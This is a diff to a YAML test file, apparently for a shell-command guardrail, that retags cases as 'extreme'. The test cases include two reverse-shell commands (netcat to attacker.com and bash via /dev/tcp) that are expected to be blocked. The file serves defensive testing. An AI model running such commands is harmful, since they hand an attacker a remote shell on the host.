@@ -33,7 +33,7 @@ cases:
         command: "nc -e /bin/sh attacker.com 4444"
         description: "Reverse shell"
     expect: blocked
-    tags: [network, security, universal]
+    tags: [network, security, extreme]
 
   - name: ngrok-tunnel
     description: "ngrok 暴露本地服務應該被擋或警告"
@@ -57,7 +57,7 @@ cases:
         command: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
         description: "Bash reverse shell"
     expect: blocked
-    tags: [network, security, universal]
+    tags: [network, security, extreme]
 
   - name: safe-curl-api-allowed
     description: "正常 API 呼叫應該放行"
